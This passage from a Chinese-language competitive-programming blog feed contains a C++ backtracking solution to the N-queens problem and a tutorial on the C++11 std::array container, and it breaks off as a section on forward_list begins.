class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-comment">//#define _CRT_SECURE_NO_DEPRECATE</span><br><span class="hljs-comment">//#include&lt;bits/stdc++.h&gt;</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;iostream&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;algorithm&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;functional&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;numeric&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;iomanip&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;string&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;vector&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;queue&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;map&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;stack&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;set&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;list&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;cstdio&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;cstring&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;cstdlib&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;cmath&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> IOS ios::sync_with_stdio(0);cin.tie(0),cout.tie(0);</span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> <span class="hljs-built_in">std</span>;<br><span class="hljs-keyword">const</span> <span class="hljs-keyword">int</span> INF=<span class="hljs-number">0x3f3f3f3f</span>;<br><span class="hljs-keyword">const</span> <span class="hljs-keyword">long</span> <span class="hljs-keyword">long</span> maxn=<span class="hljs-number">1e7</span>+<span class="hljs-number">5</span>;<br><span class="hljs-keyword">const</span> <span class="hljs-keyword">long</span> <span class="hljs-keyword">long</span> minn=<span class="hljs-number">1e2</span>+<span class="hljs-number">5</span>;<br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> PI acos(-1)</span><br><span class="hljs-keyword">int</span> a[minn];<span class="hljs-comment">//a[i]表示第i行上的皇后放于a[i]列上，例如：a[3]=7；表示第三行的皇后位于第7列上。</span><br><span class="hljs-keyword">int</span> n;<br><span class="hljs-keyword">int</span> ans=<span class="hljs-number">0</span>;<br><span class="hljs-function"><span class="hljs-keyword">bool</span> <span class="hljs-title">check</span><span class="hljs-params">(<span class="hljs-keyword">int</span> row,<span class="hljs-keyword">int</span> col)</span></span>&#123; <span class="hljs-comment">//判断第row行的皇后能不能放在第col列</span><br><span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=<span class="hljs-number">1</span>;i&lt;=row;++i)&#123; <span class="hljs-comment">//从第一行开始判断，一直判断到当前行。后面的行不需要判断，因为每一行就只放一个皇后，后面的行还没有开始放。</span><br><span class="hljs-keyword">if</span>(a[i]==col) <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>; <span class="hljs-comment">//如果第i行就已经占了col列，表示不能放在col列</span><br><span class="hljs-keyword">if</span>(i+a[i]==row+col) <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<span class="hljs-comment">//如果行和列的之和相等，即在平行与副对角线的斜线上。</span><br><span class="hljs-keyword">if</span>(i-a[i]==row-col) <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<span class="hljs-comment">//如果行和列的之差相等，即在平行与主对角线的斜线上。</span><br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">dfs</span><span class="hljs-params">(<span class="hljs-keyword">int</span> row)</span></span>&#123; <span class="hljs-comment">//表示第i行的皇后放于何处</span><br><span class="hljs-keyword">if</span>(row==n+<span class="hljs-number">1</span>) &#123; <span class="hljs-comment">//当行数超过了所给行，表示有一种解。</span><br>ans++;<br><span class="hljs-keyword">return</span> ;<br>&#125;<br><span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=<span class="hljs-number">1</span>;i&lt;=n;++i)&#123;<br><span class="hljs-keyword">if</span>(check(row,i))&#123; <span class="hljs-comment">//看row行的皇后能不能放在第i列</span><br>a[row]=i;<br>dfs(row+<span class="hljs-number">1</span>);<br>a[row]=<span class="hljs-number">0</span>; <span class="hljs-comment">//回溯</span><br>&#125;<br>&#125;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">solve</span><span class="hljs-params">()</span></span>&#123;<br><span class="hljs-keyword">while</span>(<span class="hljs-built_in">cin</span>&gt;&gt;n&amp;&amp;n)&#123;<br>ans=<span class="hljs-number">0</span>;<br>dfs(<span class="hljs-number">1</span>);<br><span class="hljs-built_in">cout</span>&lt;&lt;ans&lt;&lt;<span class="hljs-built_in">endl</span>;<br>&#125;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>IOS;<br>solve();<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>ACM经典问题</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ACM-C++STL新增容器</title>
    <link href="/2021/04/15/ACM/ACM-C++STL%E6%96%B0%E5%A2%9E%E5%AE%B9%E5%99%A8/"/>
    <url>/2021/04/15/ACM/ACM-C++STL%E6%96%B0%E5%A2%9E%E5%AE%B9%E5%99%A8/</url>
    
    <content type="html"><![CDATA[<p>介绍记录STL提供新增加的容器，记录其用法和一些相关的函数。</p><h2 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h2><h3 id="一-STL新增容器"><a href="#一-STL新增容器" class="headerlink" title="一.STL新增容器"></a>一.STL新增容器</h3><p><strong>注意：</strong> 在一些编译器中是不能正常使用新增的容器的。这点需要注意。</p><h4 id="1-array容器"><a href="#1-array容器" class="headerlink" title="1.array容器"></a>1.array容器</h4><p>array 容器是 C++ 11 标准中新增的序列容器，简单地理解，它就是在 C++ 普通数组的基础上，添加了一些成员函数和全局函数。在使用上，它比普通数组更安全，且效率并没有因此变差。和其它容器不同，array 容器的大小是固定的，无法动态的扩展或收缩，这也就意味着，在使用该容器的过程无法借由增加或移除元素而改变其大小，它只允许访问或者替换存储的元素。<br>array 容器以类模板的形式定义在 <array> 头文件，并位于命名空间 std 中。如下：</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-keyword">namespace</span> <span class="hljs-built_in">std</span>&#123;<br>    <span class="hljs-keyword">template</span> &lt;<span class="hljs-keyword">typename</span> T, <span class="hljs-keyword">size_t</span> N&gt;<br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">array</span>;</span><br>&#125;<br></code></pre></div></td></tr></table></figure><p><strong>注意：</strong>在 array&lt;T,N&gt; 类模板中，T 用于指明容器中的存储的具体数据类型，N 用于指明容器的大小，需要注意的是，这里的 N 必须是常量，不能用变量表示。<br>array 容器有多种初始化方式，如下代码展示了如何创建具有 10 个 double 类型元素的 array 容器：</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-built_in">std</span>::<span class="hljs-built_in">array</span>&lt;<span class="hljs-keyword">double</span>, 10&gt; values;<br></code></pre></div></td></tr></table></figure><p><strong>如果程序中已经默认指定了 std 命令空间，这里可以省略 std::。</strong><br>这样就创建好了一个名为 values 的 array 容器，其包含 10 个浮点型元素。但是，由于未显式指定这 10 个元素的值，因此使用这种方式创建的容器中，各个元素的值是不确定的（array 容器不会做默认初始化操作）。</p><p>通过如下创建 array 容器的方式，可以将所有的元素初始化为 0 或者和默认元素类型等效的值：</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-built_in">std</span>::<span class="hljs-built_in">array</span>&lt;<span class="hljs-keyword">double</span>, 10&gt; values &#123;&#125;; <span class="hljs-comment">//容器中所有的元素都会被初始化为 0.0。</span><br></code></pre></div></td></tr></table></figure><p>在创建 array 容器的实例时，也可以像创建常规数组那样对元素进行初始化：</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-built_in">std</span>::<span class="hljs-built_in">array</span>&lt;<span class="hljs-keyword">double</span>, 10&gt; values &#123;<span class="hljs-number">0.5</span>,<span class="hljs-number">1.0</span>,<span class="hljs-number">1.5</span>,<span class="hljs-number">2.0</span>&#125;;<br></code></pre></div></td></tr></table></figure><p>这里只初始化了前 4 个元素，剩余的元素都会被初始化为 0.0。</p><p>除此之外，array 容器还提供有很多功能实用的成员函数，</p><table><thead><tr><th>成员函数</th><th>功能</th></tr></thead><tbody><tr><td>begin()</td><td>返回指向容器中第一个元素的随机访问迭代器。</td></tr><tr><td>end()</td><td>返回指向容器最后一个元素之后一个位置的随机访问迭代器，通常和 begin() 结合使用。</td></tr><tr><td>rbegin()</td><td>返回指向最后一个元素的随机访问迭代器。</td></tr><tr><td>rend()</td><td>返回指向第一个元素之前一个位置的随机访问迭代器。</td></tr><tr><td>cbegin()</td><td>和 begin() 功能相同，只不过在其基础上增加了 const 属性，不能用于修改元素。</td></tr><tr><td>cend()</td><td>和 end() 功能相同，只不过在其基础上，增加了 const 属性，不能用于修改元素。</td></tr><tr><td>crbegin()</td><td>和 rbegin() 功能相同，只不过在其基础上，增加了 const 属性，不能用于修改元素。</td></tr><tr><td>crend()</td><td>和 rend() 功能相同，只不过在其基础上，增加了 const 属性，不能用于修改元素。</td></tr><tr><td>size()</td><td>返回容器中当前元素的数量，其值始终等于初始化 array 类的第二个模板参数 N。</td></tr><tr><td>max_size()</td><td>返回容器可容纳元素的最大数量，其值始终等于初始化 array 类的第二个模板参数 N。</td></tr><tr><td>empty()</td><td>判断容器是否为空，和通过 size()==0 的判断条件功能相同，但其效率可能更快。</td></tr><tr><td>at(n)</td><td>返回容器中 n 位置处元素的引用，该函数自动检查 n 是否在有效的范围内，如果不是则抛出 out_of_range 异常。</td></tr><tr><td>front()</td><td>返回容器中第一个元素的直接引用，该函数不适用于空的 array 容器。</td></tr><tr><td>back()</td><td>返回容器中最后一个元素的直接应用，该函数同样不适用于空的 array 容器。</td></tr><tr><td>data()</td><td>返回一个指向容器首个元素的指针。利用该指针，可实现复制容器中所有元素等类似功能。</td></tr><tr><td>fill(val)</td><td>将 val 这个值赋值给容器中的每个元素。</td></tr><tr><td>array1.swap(array2)</td><td>交换 array1 和 array2 容器中的所有元素，但前提是它们具有相同的长度和类型。</td></tr></tbody></table><p>除此之外，C++ 11 标准库还新增加了 begin() 和 end() 这 2 个函数，和 array 容器包含的 begin() 和 end() 成员函数不同的是，标准库提供的这 2 个函数的操作对象，既可以是容器，还可以是普通数组。当操作对象是容器时，它和容器包含的 begin() 和 end() 成员函数的功能完全相同；如果操作对象是普通数组，则 begin() 函数返回的是指向数组第一个元素的指针，同样 end() 返回指向数组中最后一个元素之后一个位置的指针（注意不是最后一个元素）。</p><p>在 <array> 头文件中还重载了 get() 全局函数，该重载函数的功能是访问容器中指定的元素，并返回该元素的引用。正是由于 array 容器中包含了 at() 这样的成员函数，使得操作元素时比普通数组更安全。</p><p>部分成员函数演示运用代码：</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;array&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> <span class="hljs-built_in">std</span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">array</span>&lt;<span class="hljs-keyword">int</span>, 4&gt; values&#123;&#125;;<br>    <span class="hljs-comment">//初始化 values 容器为 &#123;0,1,2,3&#125;</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; values.size(); i++) &#123;<br>        values.at(i) = i;<br>    &#125;<br>    <span class="hljs-comment">//使用 get() 重载函数输出指定位置元素</span><br>    <span class="hljs-built_in">cout</span> &lt;&lt; get&lt;<span class="hljs-number">3</span>&gt;(values) &lt;&lt; <span class="hljs-built_in">endl</span>;<br>    <span class="hljs-comment">//如果容器不为空，则输出容器中所有的元素</span><br>    <span class="hljs-keyword">if</span> (!values.empty()) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">auto</span> val = values.begin(); val &lt; values.end(); val++) &#123;<span class="hljs-comment">//auto 关键字，可以使编译器自动判定变量的类型。</span><br>            <span class="hljs-built_in">cout</span> &lt;&lt; *val &lt;&lt; <span class="hljs-string">&quot; &quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-comment">//输出结果</span><br><span class="hljs-number">3</span><br><span class="hljs-number">0</span> <span class="hljs-number">1</span> <span class="hljs-number">2</span> <span class="hljs-number">3</span><br></code></pre></div></td></tr></table></figure><hr><p>当 array 容器创建完成之后，最常做的操作就是获取其中的元素，甚至有时还会通过循环结构获取多个元素。</p><h5 id="访问元素"><a href="#访问元素" class="headerlink" title="访问元素"></a>访问元素</h5><blockquote><p><strong>1.访问array容器中单个元素</strong></p></blockquote><p>可以通过容器名[]的方式直接访问和使用容器中的元素，这和 C++ 标准数组访问元素的方式相同，比如：</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++">values[<span class="hljs-number">4</span>] = values[<span class="hljs-number">3</span>] + <span class="hljs-number">2.0</span>*values[<span class="hljs-number">1</span>];<br></code></pre></div></td></tr></table></figure><p>第 5 个元素的值被赋值为右边表达式的值。需要注意的是，使用如上这样方式，由于没有做任何边界检查，所以即便使用越界的索引值去访问或存储元素，也不会被检测到。</p><p>为了能够有效地避免越界访问的情况，可以使用 array 容器提供的 at() 成员函数，例如 :</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++">values.at (<span class="hljs-number">4</span>) = values.at(<span class="hljs-number">3</span>) + <span class="hljs-number">2.0</span>*values.at(<span class="hljs-number">1</span>);<br></code></pre></div></td></tr></table></figure><p>和前一行语句实现的功能相同，其次当传给 at() 的索引是一个越界值时，程序会抛出 std::out_of_range 异常。因此当需要访问容器中某个指定元素时，建议大家使用 at()，除非确定索引没有越界。</p><blockquote><p>为什么 array 容器在重载 [] 运算符时，没有实现边界检查的功能呢？<br>因为性能。如果每次访问元素，都去检查索引值，无疑会产生很多开销。当不存在越界访问的可能时，就能避免这种开销。</p></blockquote><p>除此之外，array 容器还提供了 get<n> 模板函数，它是一个辅助函数，能够获取到容器的第 n 个元素。需要注意的是，该模板函数中，参数的实参必须是一个在编译时可以确定的常量表达式，所以它不能是一个循环变量。也就是说，它只能访问模板参数指定的元素，编译器在编译时会对它进行检查。</p><p>使用 get<n> 模板函数代码：</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;array&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> <span class="hljs-built_in">std</span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">array</span>&lt;<span class="hljs-built_in">string</span>, 5&gt; words&#123; <span class="hljs-string">&quot;one&quot;</span>,<span class="hljs-string">&quot;two&quot;</span>,<span class="hljs-string">&quot;three&quot;</span>,<span class="hljs-string">&quot;four&quot;</span>,<span class="hljs-string">&quot;five&quot;</span> &#125;;<br>    <span class="hljs-built_in">cout</span> &lt;&lt; get&lt;<span class="hljs-number">3</span>&gt;(words) &lt;&lt; <span class="hljs-built_in">endl</span>; <span class="hljs-comment">// Output words[3]</span><br>    <span class="hljs-comment">//cout &lt;&lt; get&lt;6&gt;(words) &lt;&lt; std::endl; //越界，会发生编译错误</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-comment">//运行结果</span><br>four<br></code></pre></div></td></tr></table></figure><p>另外，array 容器提供了 data() 成员函数，通过调用该函数可以得到指向容器首个元素的指针。通过该指针，我们可以获得容器中的各个元素，例如：</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;array&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> <span class="hljs-built_in">std</span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">array</span>&lt;<span class="hljs-keyword">int</span>, 5&gt; words&#123;<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>&#125;;<br>    <span class="hljs-built_in">cout</span> &lt;&lt; *( words.data()+<span class="hljs-number">1</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-comment">//运行结果</span><br><span class="hljs-number">2</span><br></code></pre></div></td></tr></table></figure><blockquote><p><strong>2.访问array容器中多个元素</strong></p></blockquote><p>array 容器提供的 size() 函数能够返回容器中元素的个数（函数返回值为 size_t 类型），例子：计算求和：</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-keyword">double</span> total = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">for</span>(<span class="hljs-keyword">size_t</span> i = <span class="hljs-number">0</span> ; i &lt; values.size() ; ++i)<br>&#123;<br>    total += values[i];<br>&#125;<br></code></pre></div></td></tr></table></figure><p>size() 函数的存在，为 array 容器提供了标准数组所没有的优势，即能够知道它包含多少元素。</p><p>并且，接受数组容器作为参数的函数，只需要通过调用容器的成员函数 size()，就能得到元素的个数。除此之外，通过调用 array 容器的 empty() 成员函数，即可知道容器中有没有元素（如果容器中没有元素，此函数返回 true），如下所示：</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-keyword">if</span>(values.empty())<br>    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;The container has no elements.\n&quot;</span>;<br><span class="hljs-keyword">else</span><br>    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;The container has &quot;</span>&lt;&lt; values.size()&lt;&lt;<span class="hljs-string">&quot;elements.\n&quot;</span>;<br></code></pre></div></td></tr></table></figure><p>然而，很少会创建空的 array 容器，因为当生成一个 array 容器时，它的元素个数就固定了，而且无法改变，所以生成空 array 容器的唯一方法是将模板的第二个参数指定为 0，但这种情况基本不可能发生。</p><blockquote><p>array 容器之所以提供 empty() 成员函数的原因，对于其他元素可变或者元素可删除的容器（例如 vector、deque 等）来说，它们使用 empty() 时的机制是一样的，因此为它们提供了一个一致性的操作。</p></blockquote><p>除了借助 size() 外，对于任何可以使用迭代器的容器，都可以使用基于范围的循环，因此能够更加简便地计算容器中所有元素的和，比如：</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-keyword">double</span> total = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">for</span>(<span class="hljs-keyword">auto</span>&amp;&amp; value : values)<br>    total += value;<br></code></pre></div></td></tr></table></figure><p>综合案例：</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iomanip&gt; </span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;array&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> <span class="hljs-built_in">std</span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">array</span>&lt;<span class="hljs-keyword">int</span>, 5&gt; values1;<br>    <span class="hljs-built_in">array</span>&lt;<span class="hljs-keyword">int</span>, 5&gt; values2;<br>    <span class="hljs-comment">//初始化 values1 为 &#123;0,1,2,3,4&#125;</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">size_t</span> i = <span class="hljs-number">0</span>; i &lt; values1.size(); ++i)<br>    &#123;<br>        values1.at(i) = i;<br>    &#125;<br>    <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;values1[0] is : &quot;</span> &lt;&lt; values1[<span class="hljs-number">0</span>] &lt;&lt; <span class="hljs-built_in">endl</span>;<br>    <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;values1[1] is : &quot;</span> &lt;&lt; values1.at(<span class="hljs-number">1</span>) &lt;&lt; <span class="hljs-built_in">endl</span>;<br>    <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;values1[2] is : &quot;</span> &lt;&lt; get&lt;<span class="hljs-number">2</span>&gt;(values1) &lt;&lt; <span class="hljs-built_in">endl</span>;<br>    <span class="hljs-comment">//初始化 values2 为&#123;10，11，12，13，14&#125;</span><br>    <span class="hljs-keyword">int</span> initvalue = <span class="hljs-number">10</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">auto</span>&amp; value : values2)<br>    &#123;<br>        value = initvalue;<br>        initvalue++;<br>    &#125;<br>    <span class="hljs-built_in">cout</span> &lt;&lt;  <span class="hljs-string">&quot;Values1 is : &quot;</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">auto</span> i = values1.begin(); i &lt; values1.end(); i++) &#123;<br>        <span class="hljs-built_in">cout</span> &lt;&lt; *i &lt;&lt; <span class="hljs-string">&quot; &quot;</span>;<br>    &#125;<br>    <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-built_in">endl</span> &lt;&lt; <span class="hljs-string">&quot;Values2 is : &quot;</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">auto</span> i = values2.begin(); i &lt; values2.end(); i++) &#123;<br>        <span class="hljs-built_in">cout</span> &lt;&lt; *i &lt;&lt; <span class="hljs-string">&quot; &quot;</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-comment">//运行结果</span><br>values1[<span class="hljs-number">0</span>] is : <span class="hljs-number">0</span><br>values1[<span class="hljs-number">1</span>] is : <span class="hljs-number">1</span><br>values1[<span class="hljs-number">2</span>] is : <span class="hljs-number">2</span><br>Values1 is : <span class="hljs-number">0</span> <span class="hljs-number">1</span> <span class="hljs-number">2</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span><br>Values2 is : <span class="hljs-number">10</span> <span class="hljs-number">11</span> <span class="hljs-number">12</span> <span class="hljs-number">13</span> <span class="hljs-number">14</span><br></code></pre></div></td></tr></table></figure><h4 id="2-forward-list容器"><a href="#2-forward-list容器" class="headerlink" title="2.forward_list容器"></a>2.forward_list容器</h4><p>forward_list 是 C++ 11 新添加的一类容器，其底层实现和 list 容器一样，采用的也是链表结构，只不过 forward_list 使用的是单链表，而 list 使用的是双向链表。<br>使用链表存储数据最大的特点在于，其并不会将数据进行集中存储（向数组那样），换句话说，链表中数据的存储位置是分散的、随机的，整个链表中数据的线性关系通过指针来维持。</p><p>forward_list 容器具有和 list 容器相同的特性，即擅长在序列的任何位置进行插入元素或删除元素的操作，但对于访问存储的元素，没有其它容器（如 array、vector）的效率高。<br>由于单链表没有双向链表那样灵活，因此相比 list 